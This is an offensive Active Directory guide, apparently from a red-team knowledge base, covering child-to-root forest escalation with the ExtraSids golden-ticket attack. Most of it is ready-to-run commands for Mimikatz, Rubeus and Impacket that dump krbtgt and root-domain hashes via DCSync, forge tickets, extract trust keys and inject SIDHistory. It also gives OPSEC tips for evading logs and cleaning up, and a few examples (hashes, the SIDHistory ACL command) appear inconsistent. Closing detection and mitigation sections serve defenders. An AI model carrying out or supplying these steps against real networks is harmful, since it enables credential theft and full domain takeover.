# From Domain Admin to Enterprise Admin — Cross-Forest Kerberos Attacks

## Overview

Escalating from Domain Admin in one domain to Enterprise Admin across a forest is a classic AD privilege escalation path. Enterprise Admins exist only in the **root domain** of a forest and have full administrative control over **all domains** in that forest. Compromising a child domain and leveraging the parent-child trust relationship grants the same level of access as a root domain compromise.

## What is Enterprise Admin?

Enterprise Admins (EA) are members of the `Enterprise Admins` group (RID 519) in the **root domain** of an Active Directory forest. This group:

- Exists **only** in the root domain of a forest
- Has full admin access to **every domain** in the forest by default
- Is added to each domain's `Administrators` group via the `S-1-5-21-ROOT_DOMAIN-519` SID
- Can perform forest-wide operations (schema changes, domain addition/removal, forest prep)

```
Forest: root.dom.local
├── Root Domain: root.dom.local
│   ├── Enterprise Admins (RID 519) ← TARGET
│   ├── Domain Admins (RID 512)
│   └── Schema Admins (RID 518)
│
├── Child Domain: child.dom.local ← COMPROMISED
│   └── Domain Admins (RID 512)
│
└── Child Domain: other.dom.local
    └── Domain Admins (RID 512)
```

## Forest Trust Relationships

Parent-child trusts within a forest:

- **Transitive** — Trust flows upward automatically
- **Bidirectional** — Authentication works both ways
- **Intra-forest** — SID filtering is **disabled** by default
- **NTLM and Kerberos** — Both protocols can traverse the trust

```
child.dom.local ──trusts──> root.dom.local
  │                          │
  │  SID history honored     │  No SID filtering
  │  Krbtgt hash useful     │  Inter-realm TGTs
  │  ExtraSids attack       │
  └──────────────────────────┘
```

### Trust Types

| Type | Intra-Forest | Inter-Forest |
|------|-------------|--------------|
| SID Filtering | Disabled | Enabled |
| Trust Transitivity | Full | Configurable |
| ExtraSids Attack | Works | Blocked by default |
| Trust Keys | Inter-realm TGT | Inter-realm TGT |

## SID Filtering / SID Quarantine

SID filtering prevents authentication from foreign security principals in SID history:

- **Intra-forest trusts**: SID filtering is **disabled** — SID history is honored
- **Inter-forest trusts**: SID filtering is **enabled** — SID history is stripped
- **SID quarantine**: Hardened trusts where even well-known SIDs are filtered

The ExtraSids attack exploits the fact that intra-forest trusts do NOT filter SIDs. When the KDC in the child domain issues a TGT with an Enterprise Admins SID from the parent domain, the parent domain's KDC accepts it because the trust does not enforce SID filtering.

## The ExtraSids Attack

The ExtraSids attack uses Mimikatz's `kerberos::golden` with the `/sids:` parameter to inject additional SIDs into a forged TGT's PAC (Privilege Attribute Certificate). The PAC contains the user's group memberships, and the KDC trusts them because the TGT is encrypted with the legitimate krbtgt hash.

### Why It Works

1. The child domain's KDC encrypts the TGT with the child's krbtgt hash
2. The child's TGT includes a PAC with the Enterprise Admins SID from the parent
3. When the TGT is presented to the parent domain's KDC, it validates the signature
4. The inter-realm TGT is accepted because the trust key is valid
5. The parent KDC trusts the PAC data because SID filtering is disabled

### Information Required

| Data | Description | How to Obtain |
|------|-------------|---------------|
| Child krbtgt hash | NTLM hash of child's krbtgt | `lsadump::dcsync /user:krbtgt` |
| Child domain SID | SID of child domain | `whoami /user`, `Get-DomainSID` |
| Parent domain SID | SID of root domain | `Get-Domain -Domain root.dom.local` |
| Enterprise Admins RID | Always 519 | Well-known RID |
| Parent domain FQDN | Fully qualified name | `Get-DomainTrust` |

## Step-by-Step: ExtraSids Attack

### Step 1: Get Child Domain Krbtgt Hash

```mimikatz
# On a domain controller or with DA credentials
privilege::debug

# DCSync the krbtgt hash
lsadump::dcsync /domain:child.dom.local /user:krbtgt

# Alternative: lsadump
lsadump::lsa /patch
```

Example output:
```
Domain     : CHILD / child.dom.local
RID        : 000001f6 (502)
User       : krbtgt
Hash NTLM  : aaaaaabbbbbbccccccddddddeeeeeeee
```

### Step 2: Get Target Domain SIDs

```powershell
# Child domain SID
Get-DomainSID -Domain child.dom.local
# Result: S-1-5-21-1000000001-1000000002-1000000003

# Parent domain SID
Get-Domain -Domain root.dom.local | Select DomainSID
# Result: S-1-5-21-2000000001-2000000002-2000000003

# Enterprise Admins full SID
# S-1-5-21-2000000001-2000000002-2000000003-519
```

```cmd
# Using whoami on child DC
whoami /user
# Result: S-1-5-21-1000000001-1000000002-1000000003-500 (Administrator)
```

### Step 3: Forge the Golden Ticket with ExtraSids

```mimikatz
# Forge TGT for Administrator with Enterprise Admins SID injected
kerberos::golden /user:Administrator /domain:child.dom.local /sid:S-1-5-21-CHILD /sids:S-1-5-21-ROOT-519 /krbtgt:aaaaaabbbbcccccdddddeeeeeeeeeee /ptt
```

Parameters explained:

| Parameter | Value | Purpose |
|-----------|-------|---------|
| `/user:` | Administrator | User to impersonate |
| `/domain:` | child.dom.local | Domain that issues the TGT |
| `/sid:` | S-1-5-21-CHILD | SID of the issuing domain |
| `/sids:` | S-1-5-21-ROOT-519 | Extra SID(s) to inject (EA group) |
| `/krbtgt:` | NTLM_HASH | krbtgt hash of issuing domain |
| `/ptt` | (flag) | Pass the ticket into current session |

**Critical detail**: The `/sids:` parameter can contain multiple SIDs separated by commas:
```mimikatz
kerberos::golden /user:Administrator /domain:child.dom.local /sid:S-1-5-21-CHILD /sids:S-1-5-21-ROOT-519,S-1-5-21-ROOT-512 /krbtgt:HASH /ptt
```

### Step 4: Verify the Ticket and Access Root DC

```cmd
# Check that the TGT is loaded
klist

# Test access to the root domain DC
dir \\rootdc.root.dom.local\c$
```

```mimikatz
# Verify the injected SIDs in the ticket
kerberos::list
```

### Step 5: DCSync the Root Domain

```mimikatz
# With the forged ticket in session, DCSync the parent domain
lsadump::dcsync /domain:root.dom.local /user:Administrator

# DCSync all users
lsadump::dcsync /domain:root.dom.local /all /csv

# DCSync specific high-value accounts
lsadump::dcsync /domain:root.dom.local /user:krbtgt
```

### Step 6: Full Forest Compromise

```mimikatz
# DCSync the krbtgt of the root domain for persistence
lsadump::dcsync /domain:root.dom.local /user:krbtgt

# Forge Enterprise Admin golden ticket for root domain
kerberos::golden /user:Administrator /domain:root.dom.local /sid:S-1-5-21-ROOT /krbtgt:ROOT_KRBTGT_HASH /ptt
```

## Using Rubeus

### Forge the TGT with ExtraSids

Rubeus doesn't directly forge golden tickets like Mimikatz, but you can use the `/ticket:` parameter to import a forged ticket:

```cmd
# 1. Use Rubeus to ask for a TGS using the forged TGT
# First forge the ticket with Mimikatz (or use Rubeus createnetonly)

# 2. Use asktgs with imported ticket
Rubeus.exe asktgs /service:cifs/rootdc.root.dom.local /ticket:BASE64 /ptt

# 3. Alternative: Use the ticket directly with asktgs
Rubeus.exe asktgs /service:LDAP/rootdc.root.dom.local /ticket:BASE64 /ptt
```

### Rubeus Full Chain

```cmd
# Step 1: Ask TGT with Rubeus and output in base64 for manipulation
Rubeus.exe asktgt /user:Administrator /domain:child.dom.local /rc4:HASH /ptt

# Step 2: Use the TGT to request a TGS to the root DC
Rubeus.exe asktgs /service:cifs/rootdc.root.dom.local /ticket:BASE64 /ptt
```

## Trust Ticket Approach (impacket ticketer.py)

An alternative approach uses `ticketer.py` from Impacket to forge the ticket:

```bash
# Install impacket with ticketer
pip3 install impacket

# Forge the inter-realm TGT with extra SIDs
python3 ticketer.py -nthash HASH -domain-sid S-1-5-21-CHILD -domain child.dom.local -extra-sid S-1-5-21-ROOT-519 Administrator

# Export the ticket
export KRB5CCNAME=/path/to/Administrator.ccache

# Use the ticket to authenticate
python3 secretsdump.py -k -no-pass root.dom.local/Administrator@rootdc.root.dom.local
```

### ticketer.py Parameters

| Parameter | Description |
|-----------|-------------|
| `-nthash` | krbtgt NTLM hash of the issuing domain |
| `-domain-sid` | SID of the issuing domain |
| `-domain` | FQDN of the issuing domain |
| `-extra-sid` | Additional SID to inject (Enterprise Admins) |
| `-user-id` | RID of user to impersonate (default 500) |
| `-groups` | Additional group RIDs |
| `-duration` | Ticket lifetime in hours |

### Impacket Full Chain

```bash
# Step 1: Forge ticket
python3 ticketer.py -nthash aaaa... -domain-sid S-1-5-21-CHILD -domain child.dom.local -extra-sid S-1-5-21-ROOT-519 Administrator

# Step 2: Set the ticket environment variable
export KRB5CCNAME=Administrator.ccache

# Step 3: DCSync the root domain
python3 secretsdump.py -k -no-pass root.dom.local/Administrator@rootdc.root.dom.local

# Step 4: Get all hashes from root domain
python3 secretsdump.py -k -no-pass root.dom.local/Administrator@rootdc.root.dom.local -just-dc-ntlm
```

## Inter-Realm TGTs and Trust Tickets

Inter-realm TGTs (also called "trust tickets" or "referral tickets") are used when a user in one domain needs to access resources in another domain within the same forest.

### How Trust Tickets Flow

```
User in child.dom.local ──> Resource in root.dom.local

1. User requests TGT from child KDC
2. User requests TGS for resource in root domain
3. Child KDC issues a referral TGT (inter-realm TGT) encrypted with trust key
4. User presents inter-realm TGT to root KDC
5. Root KDC issues TGS for the target resource
6. User presents TGS to the resource server
```

The inter-realm TGT is encrypted with the **trust key** (shared secret between domains), not the krbtgt hash. The ExtraSids attack works because the child domain's krbtgt hash signs the PAC, and the parent trusts the child's assertion.

### Extracting Trust Keys

```mimikatz
# Extract trust keys from the child domain
lsadump::trust /patch

# Or for a specific trust
lsadump::trust /patch /domain:root.dom.local
```

Trust keys can be used to forge inter-realm TGTs without needing the krbtgt hash, but the ExtraSids attack (which uses krbtgt) is simpler because it doesn't require the trust key.

## Alternate Attack Path: SIDHistory Injection

Instead of forging a golden ticket, you can inject SIDHistory into a user account that has an existing trust relationship:

```powershell
# PowerView - Add SIDHistory to a user
Add-DomainObjectAcl -TargetIdentity "target_user" -PrincipalIdentity "attacker_user" -Rights WriteProperty -PropertyName "sidhistory"

# Using DSMod (requires appropriate rights)
dsmod user "CN=attacker,CN=Users,DC=child,DC=dom,DC=local" -sidhistory S-1-5-21-ROOT-519
```

This modifies the `sidHistory` attribute of the user account directly. The parent domain will see the SID and grant the user Enterprise Admin privileges.

## OPSEC Considerations

### Ticket Lifetime
- Default TGT lifetime is 10 hours (configurable)
- TGTs with ExtraSids should have realistic lifetimes
- Use `/endin:` parameter in Mimikatz to set custom lifetime

### Logging and Noise
- DCSync generates Event ID 4662 (Directory Service Access)
- TGS requests to the root domain generate inter-realm TGT requests
- Using `/ptt` loads the ticket into the current process
- Consider using `createnetonly` to launch a new process with the ticket

### Mimikatz Variations

```mimikatz
# Launch a new process to avoid polluting current session
kerberos::golden /user:Administrator /domain:child.dom.local /sid:S-1-5-21-CHILD /sids:S-1-5-21-ROOT-519 /krbtgt:HASH /startoffset:-5 /endin:480 /renewmax:960 /ptt

# Save to file instead of /ptt
kerberos::golden /user:Administrator /domain:child.dom.local /sid:S-1-5-21-CHILD /sids:S-1-5-21-ROOT-519 /krbtgt:HASH /ticket:ticket.kirbi
```

### Cleanup
- Remove injected tickets: `klist purge`
- Sign out of new processes
- If SIDHistory was added, clean up the attribute

## Detection

### Event ID 4768 — Kerberos TGT Request
- TGT requested with SID history that includes Enterprise Admins
- Look for TGT requests from child domain with SIDs from parent domain
- Unusual source IPs for TGT requests

### Event ID 4662 — Directory Service Access
- DCSync operations on the root domain generate this event
- Access to `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All`

### Indicators
- TGT with SID history for Enterprise Admins (RID 519) from a non-root domain
- User account with SIDHistory attribute containing EA SID
- DCSync from a machine in a different domain
- Inter-realm TGT requests with unusual source domains

```powershell
# Query for SIDHistory modifications
Get-ADUser -Filter "sidhistory -like '*'" -Properties sidhistory

# Check all users for SIDHistory
Get-ADUser -LDAPFilter "(sidhistory=*)" -Properties sidhistory, name, samaccountname
```

## Mitigations

| Mitigation | Description | Effectiveness |
|------------|-------------|---------------|
| Enable SID Filtering | Enable SID filtering on intra-forest trusts | Prevents ExtraSids |
| SID History Quarantine | Apply to sensitive accounts and groups | Reduces blast radius |
| Monitor SIDHistory | Alert on SIDHistory attribute changes | Detection |
| Tier 0 Protection | Protect all domain admin-tier accounts | Limits krbtgt access |
| Audit Trust Relationships | Regularly review trust configurations | Prevention |
| Protected Users Group | Add high-value accounts to Protected Users | Limits NTLM exposure |

### Enabling SID Filtering

```powershell
# Enable SID filtering for a specific trust (or intra-forest) 
# WARNING: This can break some applications
netdom trust child.dom.local /domain:root.dom.local /quarantine:Yes

# Verify SID filtering status
netdom trust child.dom.local /domain:root.dom.local /verbose
```

### SID History Quarantine

```powershell
# Add well-known SIDs to the quarantine list
# This prevents specific SIDs from being honored through trusts
# Registry key: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa
# Value: SidsToQuarantine (MULTI_SZ)
```

## Cross-References

- [Child to Parent Domain Attack](../11_Attack_Scenarios/01_Child_to_Parent_Domain.md)
- [Forest Trust Abuse](../11_Attack_Scenarios/02_Forest_Trust_Abuse.md)
- [Golden Ticket](./03_Golden_Ticket.md)
- [Trust Accounts Cross Domain](../05_Privilege_Escalation/11_Trust_Accounts_Cross_Domain.md)
- [Tools Reference - Mimikatz](../09_Tools_Reference/README.md)
- [Tools Reference - Impacket](../09_Tools_Reference/README.md)
